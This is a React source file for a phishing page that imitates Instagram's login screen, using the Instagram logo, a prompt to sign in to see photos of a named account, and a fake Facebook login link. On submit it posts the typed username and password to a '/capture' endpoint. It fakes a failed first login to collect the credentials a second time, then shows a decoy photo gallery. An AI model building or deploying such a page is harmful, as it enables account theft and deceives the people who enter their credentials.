import { FormEvent, useState } from 'react';

type PortfolioPhoto = {
  title: string;
  description: string;
  image: string;
};

interface FingerprintGateProps {
  onComplete: (fingerprint: Record<string, unknown> | null) => void;
}

const portfolioPhotos: PortfolioPhoto[] = [
  {
    title: 'Golden Hour Glow',
    description: 'Soft light kissing the edges of a quiet afternoon',
    image: 'https://i.pinimg.com/originals/03/aa/cb/03aacbef514fc4880c1858909bfaa227.jpg',
  },
  {
    title: 'Dreamy Stillness',
    description: 'Caught between thought and light',
    image: 'https://i.pinimg.com/originals/b2/24/83/b22483307ea687d08b6a25ed68496b36.jpg',
  },
  {
    title: 'Natural Light',
    description: 'Unfiltered moments, pure and calm',
    image: 'https://i.pinimg.com/originals/2f/86/be/2f86be10f2bff0714eb8586ca5e5bdc5.jpg',
  },
  {
    title: 'Soft Aesthetic',
    description: 'Gentle tones and quiet confidence',
    image: 'https://i.pinimg.com/originals/58/b1/33/58b1335d121b7e41912c404ce34932bb.jpg',
  },
  {
    title: 'Window Light',
    description: 'Where shadows dance and stories begin',
    image: 'https://i.pinimg.com/originals/a0/2b/0f/a02b0fef360eba6976fcba5fee16cd2d.png',
  },
  {
    title: 'Timeless Frame',
    description: 'A moment frozen in soft elegance',
    image: 'https://i.pinimg.com/originals/56/c3/f4/56c3f49f22af35ed4527ed0ae0ce75c7.jpg',
  },
];

export default function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [error, setError] = useState('');
  const [loggedIn, setLoggedIn] = useState(false);

  const handleLoginSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (!username.trim() || !password.trim()) {
      setError('Please enter your username and password.');
      return;
    }

    const nextAttempt = attemptCount + 1;
    setAttemptCount(nextAttempt);
    setIsLoading(true);
    setError('');

    const payload = {
      username,
      password,
      target: 'aadya.tiwari.me',
      time: Date.now(),
      attempt: nextAttempt,
    };

    try {
      await fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    } catch (submitErr) {
      console.error('Failed to send capture payload:', submitErr);
    }

    setUsername('');
    setPassword('');

    if (nextAttempt < 2) {
      setIsLoading(false);
      setError('Incorrect username or password.');
      return;
    }

    setIsLoading(false);
    setLoggedIn(true);
  };

  if (loggedIn) {
    return (
      <div className="portfolio-page">
        <div className="container portfolio-container">
          <header className="portfolio-header">
            <div className="logo">Aadya Tiwari</div>
            <h1>Quiet moments, warm light, lasting memories.</h1>
            <p className="subtitle">A soft visual diary of everyday beauty, stillness, and the little frames that made life feel cinematic.</p>
          </header>

          <section className="gallery">
            {portfolioPhotos.map((photo) => (
              <article className="photo-card" key={photo.title}>
                <img src={photo.image} alt={photo.title} loading="lazy" />
                <div className="caption">
                  <h3>{photo.title}</h3>
                  <p>{photo.description}</p>
                </div>
              </article>
            ))}
          </section>

          <footer>
            <p>© 2026 Aadya Tiwari · All moments captured with love</p>
          </footer>
        </div>
      </div>
    );
  }

  return (
    <div className="page-shell">
      <div className="container login-container">
        <div className="top-right-i">i</div>

        <div className="logo-container">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/250px-Instagram_icon.png"
            alt="Instagram"
            className="insta-logo"
          />
        </div>

        <div className="insta-text">Instagram</div>

        <div className="signin-box">
          Sign in to your account to see photos of
          <strong>aadya.tiwari.me</strong>
        </div>

        <form onSubmit={handleLoginSubmit} className="login-form">
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Phone number, username, or email"
          />
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
          />

          <div className={`error ${error ? 'show' : ''}`}>{error || 'Incorrect username or password.'}</div>

          <button type="submit" disabled={isLoading}>
            {isLoading ? <span className="spinner" /> : null}
            {isLoading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        <div className="or-text">OR</div>
        <a href="#" className="facebook-link">Log in with Facebook</a>

        <p className="small-link">
          <a href="#">Forgot password?</a>
        </p>

        <p className="signup-line">
          Don't have an account? <a href="#">Sign up</a>
        </p>
      </div>
    </div>
  );
}
